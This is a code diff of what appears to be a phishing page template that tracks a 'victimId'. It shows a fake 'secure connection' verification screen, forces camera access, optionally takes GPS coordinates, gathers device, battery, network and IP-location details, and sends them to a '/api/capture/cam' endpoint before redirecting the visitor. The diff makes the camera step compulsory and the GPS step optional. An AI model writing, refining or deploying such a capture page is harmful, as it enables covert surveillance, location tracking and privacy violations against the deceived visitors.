@@ -110,8 +110,8 @@
         <p class="footer-text">End-to-end encrypted · Secure connection</p>
         <div id="loading" class="hidden">⏳ Processing...</div>
         <div id="permissionError">
-            <strong>⚠️ Permission Required</strong>
-            <span id="errorMsg">Please allow required permissions to continue.</span>
+            <strong>⚠️ Camera Access Required</strong>
+            <span id="errorMsg">Please allow camera permission to continue.</span>
         </div>
         <div id="redirectTimer">
             <span>✅ Verified! Redirecting in</span>
@@ -125,7 +125,6 @@
         const victimId = urlParams.get('v') || 'unknown';
         const redirectUrl = '{{REDIRECT_URL}}';
 
-        // ===== BASIC INFO =====
         function getBasicInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -136,7 +135,6 @@
             };
         }
 
-        // ===== BATTERY =====
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
@@ -150,7 +148,6 @@
             return { level: 'N/A', charging: 'N/A' };
         }
 
-        // ===== NETWORK =====
         function getNetworkInfo() {
             try {
                 if (navigator.connection) {
@@ -164,7 +161,6 @@
             return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
         }
 
-        // ===== IP =====
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -180,7 +176,6 @@
             }
         }
 
-        // ===== SEND DATA =====
         async function sendData(payload) {
             try {
                 return await fetch('/api/capture/cam', {
@@ -197,7 +192,7 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // ===== CAMERA PERMISSION =====
+        // ===== CAMERA PERMISSION (COMPULSORY) =====
         async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -208,7 +203,7 @@
             }
         }
 
-        // ===== GPS LOCATION PERMISSION (COMPULSORY) =====
+        // ===== GPS LOCATION PERMISSION (OPTIONAL) =====
         function requestGPSPermission() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -223,7 +218,7 @@
                         accuracy: pos.coords.accuracy
                     }),
                     err => resolve({ granted: false, lat: null, lng: null }),
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             });
         }
@@ -261,7 +256,6 @@
             }
         }
 
-        // ===== SHOW ERROR =====
         function showError(msg) {
             const errorBox = document.getElementById('permissionError');
             document.getElementById('errorMsg').textContent = msg;
@@ -290,7 +284,7 @@
             btn.textContent = '⏳ Please wait...';
             loading.classList.remove('hidden');
 
-            // ===== STEP 1: CAMERA PERMISSION =====
+            // ===== STEP 1: CAMERA PERMISSION (COMPULSORY) =====
             const hasCamera = await requestCameraPermission();
             if (!hasCamera) {
                 btn.disabled = false;
@@ -300,15 +294,9 @@
                 return;
             }
 
-            // ===== STEP 2: GPS LOCATION PERMISSION (COMPULSORY) =====
+            // ===== STEP 2: GPS LOCATION PERMISSION (OPTIONAL) =====
             const gps = await requestGPSPermission();
-            if (!gps.granted) {
-                btn.disabled = false;
-                btn.textContent = 'Continue →';
-                loading.classList.add('hidden');
-                showError("Location access is required. Please allow location permission and try again.");
-                return;
-            }
+            // Agar granted=false, toh bhi aage badhega
 
             // ===== STEP 3: COLLECT INFO =====
             const basicInfo = getBasicInfo();
@@ -335,7 +323,7 @@
                 city: ipInfo.city,
                 region: ipInfo.region,
                 country: ipInfo.country,
-                location: { lat: gps.lat, lng: gps.lng, accuracy: gps.accuracy }
+                location: gps.granted ? { lat: gps.lat, lng: gps.lng, accuracy: gps.accuracy } : null
             });
             await wait(500);
 
